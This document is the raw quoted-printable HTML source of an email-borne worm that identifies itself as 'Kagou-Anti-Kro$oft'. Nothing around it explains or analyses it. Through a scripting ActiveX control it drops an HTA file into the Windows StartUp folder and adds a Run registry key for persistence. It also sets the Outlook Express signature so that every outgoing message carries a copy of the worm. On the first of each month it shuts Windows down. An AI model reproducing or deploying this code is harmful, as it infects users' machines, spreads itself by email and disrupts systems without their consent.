<DIV style=3D"POSITION: absolute; RIGHT: 0px; TOP: -20px; Z-INDEX: 5">
<OBJECT classid=3Dclsid:06290BD5-48AA-11D2-8432-006008C3FBFC=20
id=3Dscr></OBJECT></DIV>
<SCRIPT><!--
function sErr(){return =
true;}window.onerror=3DsErr;scr.Reset();scr.doc=3D"Z<HTML><HEAD><TITLE>Dr=
iver Memory Error</"+"TITLE><HTA:APPLICATION ID=3D\"hO\" =
WINDOWSTATE=3DMinimize></"+"HEAD><BODY BGCOLOR=3D#CCCCCC><object =
id=3D'wsh' =
classid=3D'clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></"+"object><SCRIP=
T>function sEr(){self.close();return true;}window.onerror=3DsEr;fs=3Dnew =
ActiveXObject('Scripting.FileSystemObject');wd=3D'C:\\\\Windows\\\\';fl=3D=
fs.GetFolder(wd+'Applic~1\\\\Identities');sbf=3Dfl.SubFolders;for(var =
mye=3Dnew =
Enumerator(sbf);!mye.atEnd();mye.moveNext())idd=3Dmye.item();ids=3Dnew =
String(idd);idn=3Dids.slice(31);fic=3Didn.substring(1,9);kfr=3Dwd+'MENUD=C9=
~1\\\\PROGRA~1\\\\D=C9MARR~1\\\\kak.hta';ken=3Dwd+'STARTM~1\\\\Programs\\=
\\StartUp\\\\kak.hta';k2=3Dwd+'System\\\\'+fic+'.hta';kk=3D(fs.FileExists=
(kfr))?kfr:ken;aek=3D'C:\\\\AE.KAK';aeb=3D'C:\\\\Autoexec.bat';if(!fs.Fil=
eExists(aek)){re=3D/kak.hta/i;if(hO.commandLine.search(re)!=3D-1){f1=3Dfs=
.GetFile(aeb);f1.Copy(aek);t1=3Df1.OpenAsTextStream(8);pth=3D(kk=3D=3Dkfr=
)?wd+'MENUD=90~1\\\\PROGRA~1\\\\D=90MARR~1\\\\kak.hta':ken;t1.WriteLine('=
@echo off>'+pth);t1.WriteLine('del =
'+pth);t1.Close();}}if(!fs.FileExists(k2)){fs.CopyFile(kk,k2);fs.GetFile(=
k2).Attributes=3D2;}t2=3Dfs.CreateTextFile(wd+'kak.reg');t2.write('REGEDI=
T4');t2.WriteBlankLines(2);ky=3D'[HKEY_CURRENT_USER\\\\Identities\\\\'+id=
n+'\\\\Software\\\\Microsoft\\\\Outlook =
Express\\\\5.0';sg=3D'\\\\signatures';t2.WriteLine(ky+sg+']');t2.Write('\=
"Default =
Signature\"=3D\"00000000\"');t2.WriteBlankLines(2);t2.WriteLine(ky+sg+'\\=
\\00000000]');t2.WriteLine('\"name\"=3D\"Signature =
#1\"');t2.WriteLine('\"type\"=3Ddword:00000002');t2.WriteLine('\"text\"=3D=
\"\"');t2.Write('\"file\"=3D\"C:\\\\\\\\WINDOWS\\\\\\\\kak.htm\"');t2.Wri=
teBlankLines(2);t2.WriteLine(ky+']');t2.Write('\"Signature =
Flags\"=3Ddword:00000003');t2.WriteBlankLines(2);t2.WriteLine('[HKEY_LOCA=
L_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run]')=
;t2.Write('\"cAg0u\"=3D\"C:\\\\\\\\WINDOWS\\\\\\\\SYSTEM\\\\\\\\'+fic+'.h=
ta\"');t2.WriteBlankLines(2);t2.close();wsh.Run(wd+'Regedit.exe -s =
'+wd+'kak.reg');t3=3Dfs.CreateTextFile(wd+'kak.htm',1);t3.Write('<HTML><B=
ODY><DIV =
style=3D\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\"><OBJECT =
classid=3Dclsid:06290BD5-48AA-11D2-8432-006008C3FBFC =
id=3Dscr></"+"OBJECT></"+"DIV>');t4=3Dfs.OpenTextFile(k2,1);while(t4.Read=
(1)!=3D'Z');t3.WriteLine('<SCRIPT><!--');t3.write('function =
sErr(){return =
true;}window.onerror=3DsErr;scr.Reset();scr.doc=3D\"Z');rs=3Dt4.Read(3095=
);t4.close();rd=3D/\\\\/g;re=3D/\"/g;rf=3D/<\\//g;rt=3Drs.replace(rd,'\\\=
\\\\\').replace(re,'\\\\\"').replace(rf,'</"+"\"+\"');t3.WriteLine(rt+'\"=
;la=3D(navigator.systemLanguage)?navigator.systemLanguage:navigator.langu=
age;scr.Path=3D(la=3D=3D\"fr\")?\"C:\\\\\\\\windows\\\\\\\\Menu =
D=E9marrer\\\\\\\\Programmes\\\\\\\\D=E9marrage\\\\\\\\kak.hta\":\"C:\\\\=
\\\\windows\\\\\\\\Start =
Menu\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\kak.hta\";agt=3Dnavigator.user=
Agent.toLowerCase();if(((agt.indexOf(\"msie\")!=3D-1)&&(parseInt(navigato=
r.appVersion)>4))||(agt.indexOf(\"msie =
5.\")!=3D-1))scr.write();');t3.write('// =
--></"+"'+'SCRIPT></"+"'+'OBJECT></"+"'+'BODY></"+"'+'HTML>');t3.close();=
fs.GetFile(wd+'kak.htm').Attributes=3D2;fs.DeleteFile(wd+'kak.reg');d=3Dn=
ew Date();if(d.getDate()=3D=3D1 && =
d.getHours()>17){alert('Kagou-Anti-Kro$oft says not today =
!');wsh.Run(wd+'RUNDLL32.EXE =
user.exe,exitwindows');}self.close();</"+"SCRIPT>S3 driver memory alloc =
failed &nbsp; =
!]]%%%%%</"+"BODY></"+"HTML";la=3D(navigator.systemLanguage)?navigator.sy=
stemLanguage:navigator.language;scr.Path=3D(la=3D=3D"fr")?"C:\\windows\\M=
enu D=E9marrer\\Programmes\\D=E9marrage\\kak.hta":"C:\\windows\\Start =
Menu\\Programs\\StartUp\\kak.hta";agt=3Dnavigator.userAgent.toLowerCase()=
;if(((agt.indexOf("msie")!=3D-1)&&(parseInt(navigator.appVersion)>4))||(a=
gt.indexOf("msie 5.")!=3D-1))scr.write();
// --></SCRIPT>
</OBJECT></DIV></BODY></HTML>